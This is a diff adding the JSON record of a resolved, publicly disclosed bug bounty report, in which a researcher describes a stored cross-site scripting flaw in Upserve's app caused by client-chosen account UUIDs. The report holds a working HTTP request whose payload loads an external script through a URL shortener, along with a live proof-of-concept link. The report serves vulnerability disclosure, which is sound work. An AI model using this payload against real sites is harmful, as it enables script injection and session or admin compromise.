@@ -1,0 +1,151 @@
+{
+  "id": 249131,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDkxMzE=",
+  "url": "https://hackerone.com/reports/249131",
+  "title": "Ability to create own account UUID leads to stored XSS",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2017-07-13T05:57:02.081Z",
+  "submitted_at": "2017-07-13T05:57:02.081Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "cache-money",
+    "url": "/cache-money",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/075/736/f78da6d0fa17c4d39be1f8088656c23763451dc2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 21981,
+    "url": "https://hackerone.com/upserve",
+    "handle": "upserve",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/021/981/780e51432acea84f3fe52455f0009230a87ee31e_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/021/981/780e51432acea84f3fe52455f0009230a87ee31e_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Upserve ",
+      "twitter_handle": "getupserve",
+      "website": "http://upserve.com",
+      "about": "Upserve offers cloud point of sale for restaurants, actionable analytics, payment processing, and mobile restaurant management."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2019-06-10T15:50:36.553Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-06-10T15:50:36.452Z",
+  "team_member_agreed_on_going_public_at": "2019-06-06T18:09:26.425Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I found an interesting bug where the system allows a user to create their own UUIDs. There are character length restrictions on this action, however it's not bound to a specific set of characters. Even so, I was able to include an external script that I URL shortened to just hit the character limit exactly. I was lucky I didn't need to add the closing script tag, because the one at the end of the line takes care of it. I wanted to get a full PoC rather than an `alert(1)`, because I think it could have been argued that the space was too small to actually do anything meaningful with.\n\nThis attack is similar in the way to #246806, except I'm quite confident this will be executed on admin panels and anywhere else a UUID is displayed, since sanitization on that attribute is highly unlikely.\n\n**PoC**\nJust replace the email with the one you own, and click the email confirmation link.\n```\nPOST /c/user HTTP/1.1\nHost: app.upserve.com\nAccept: application/json\nAccept-Language: en-US,en;q=0.5\nX-Requested-With: XMLHttpRequest\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nReferer: https://app.upserve.com/settings/account\nContent-Length: 134\nContent-Type: text/plain;charset=UTF-8\nDNT: 1\nConnection: close\n\nuuid=</script><script src=//is.gd/z0i2sU>&email=[YOUR EMAIL]&brand_pretty_url=ace-wasabis-rock-n-roll-sushi\n```\n\n**Live PoC**\nVisit the following page: https://app.upserve.com/b/ace-wasabis-rock-n-roll-sushi?email_token=2aa7296c678e11e7ab2f0242ac110002\n\nThe generated HTML looks like:\n`YUI.namespace('Env.DATA').consumer = {\"uuid\":\"</script><script src=//is.gd/z0i2sU>\",\"firstName\":null,`\n\nThanks,\n-- Tanner",
+  "bounty_amount": "1500.0",
+  "formatted_bounty": "$1,500",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2019-07-06T18:09:26.525Z",
+  "allow_singular_disclosure_after": -215903570.00577354,
+  "singular_disclosure_allowed": true,
+  "vote_count": 205,
+  "voters": [
+    "webhak",
+    "tangoj",
+    "milly",
+    "rmmal",
+    "orange303",
+    "bb4cc4200b404d13a462df1",
+    "usamasood",
+    "lboy",
+    "n1m0",
+    "drtrace",
+    "and 195 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 260,
+    "asset_type": "URL",
+    "asset_identifier": "app.upserve.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "id": 16539,
+      "category": "team",
+      "content": "The server allows the client to create and submit its own UUID which was not validated. This resulted in the ability to create a crafted XSS payload.",
+      "updated_at": "2019-06-06T18:09:19.302Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 177914,
+        "username": "upserve-bryan",
+        "name": "Bryan Brannigan",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": "https://upserve.com",
+        "location": "",
+        "created_at": "2017-06-23T12:52:45.774Z",
+        "url": "https://hackerone.com/upserve-bryan",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/177/914/953184670ceb43d71870f5de769683ac4614b579_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/177/914/953184670ceb43d71870f5de769683ac4614b579_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/177/914/953184670ceb43d71870f5de769683ac4614b579_original.png/d6d8259739a2a4d509639b7804214d057bca547cc3fafe509ec3e3a86321b1d1"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
